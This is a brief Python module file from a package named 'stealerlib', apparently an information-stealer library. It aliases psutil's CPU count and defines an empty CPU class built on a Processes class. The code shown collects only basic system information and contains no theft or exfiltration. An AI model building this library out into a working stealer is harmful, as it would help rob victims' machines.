#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/system/cpu/__init__.py
"""

from stealerlib.system import *
from stealerlib.system.cpu.processes import Processes

get_cpu_count = psutil.cpu_count


class CPU(Processes):
    """This class provides methods for extracting CPU-related information using the psutil library"""

    def __init__(self):
        super(CPU, self).__init__()